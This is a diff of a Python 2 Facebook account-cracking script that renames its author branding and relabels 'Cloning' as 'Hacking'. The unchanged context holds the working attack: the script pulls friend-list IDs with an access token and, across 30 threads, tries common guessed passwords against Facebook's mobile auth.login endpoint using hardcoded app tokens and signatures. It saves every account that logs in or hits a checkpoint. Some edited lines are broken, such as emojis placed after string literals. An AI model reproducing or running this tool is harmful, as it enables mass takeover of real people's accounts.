-        jalan(' \033[1;95m         Start Cloning Indian Old ID')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking Indian Old ID')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -2408,7 +2473,7 @@ def pilih_phone():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BROTHER
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -2468,7 +2533,7 @@ def pilih_phone():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'Katrinakaif'
+											pass5 = 'Katrinakaif'😋
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -2482,7 +2547,7 @@ def pilih_phone():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Sunnyleon'
+													pass6 = 'Sunnyleon'😋
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -2518,19 +2583,19 @@ def pilih_phone():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 Jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....KHAN-BROTHER....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;94m +971528752764"""
+                FACEBOOK
+              \033[1;94m Mr.KhanVau420"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2547,7 +2612,7 @@ def mail():
 		login()
 	os.system('clear')
 	print logo16
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Pakistan Old."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mHacking Friend List Public ID Pakistan Old."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_mail()
@@ -2561,7 +2626,7 @@ def pilih_mail():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mJAM-SHAHRUKH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mKHAN-BROTHER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -2585,11 +2650,12 @@ def pilih_mail():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning Pakistan Old ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m          Start Hacking Pakistan Old ')
+	     
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -2599,7 +2665,7 @@ def pilih_mail():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BROTHER
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -2709,20 +2775,20 @@ def pilih_mail():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:Jam_Shahrukh
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
 
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....KHAN-BROTHER....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;94m +971528752764"""
+                FACEBOOK 
+              \033[1;94m Mr.KhanVau420"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2753,7 +2819,7 @@ def pilih_isi():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mJAM-SHAHRUKH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mKHAN-BROTHER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -2777,11 +2843,11 @@ def pilih_isi():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHackig\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning JAM-SHAHRUKH')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m          Start Hacking KHAN-BROTHER')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -2791,7 +2857,7 @@ def pilih_isi():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh 
+			pass #Dev:KHAN_BROTHER
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -2901,10 +2967,10 @@ def pilih_isi():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_Shahrukh
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
